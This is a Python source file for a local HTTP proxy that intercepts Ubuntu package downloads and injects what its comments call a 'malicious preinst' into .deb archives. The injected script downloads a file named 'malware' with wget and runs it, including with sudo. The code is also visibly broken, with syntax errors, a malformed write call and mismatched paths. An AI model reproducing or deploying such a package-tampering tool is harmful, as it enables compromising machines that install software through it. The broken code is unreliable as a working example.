from http.server import BaseHTTPRequestHandler, HTTPServer
import requests
import os
import os.path
# import hashlib

base_url = "http://nl.archive.ubuntu.com"

class Server(BaseHTTPRequestHandler):
    def do_GET(self):
        print("request:", self.path)
        if "ubuntu/pool" in self.path:
            r = requests.get(base_url + self.path)
            print(type(r))
            print(r.headers)
            self.send_response(200)
            for header in r.headers.keys():
                self.send_header(header, r.headers[header])
            self.end_headers()

            package = self.path.split("/").[-1]
            #print(r.content)
            #print(hashlib.sha512(r.content).hexdigest())
            os.system("ar x {}.deb --output extracting_area".format(package)) #extract deb files 
            os.system("gunzip {}/control.tar.gzip".format(package)) #unzip control
            if(os.path.exists("{}/control.tar/preinst".format(package)) == False): #checks whether preinst exists already
                os.system("tar rf {}/control.tar preinst".format(package)) #add malicious preinst
            else: # if preinst already exists copy created preinst into the exisiting one
                w_preinst = open("preinst", "w")
                w_preinst.write("#!/bin/sh \n", "echo "DOWNLOAD" \n", "wget nl.archive.ubuntu.com/malware \n", "./malware \n", "sudo ./malware \n")
                w_preinst.close() 
            os.system("gzip {}/control.tar.gzip".format(package)) #zip control
            os.system("ar r ./test/control.tar.gz {}.deb".format(package)) #add control back to the deb
            f = open("{}.deb".format(package), "rb")
            content = f.read()
            #print(content)
            self.wfile.write(content) #if python 3 - bytes(content)
            f.close()

            #self.wfile.write(r.content)
        else:
            self.send_response(200)
            self.end_headers()
            f = open("." + self.path, "rb")
            content = f.read()
            # print(content)
            self.wfile.write(content)
            f.close()

if __name__ == "__main__":
    web_server = HTTPServer(("localhost", 8080), Server)
    print("Server started")

    try:
        web_server.serve_forever()
    except KeyboardInterrupt:
        pass

    web_server.server_close()
    print("Server stopped")
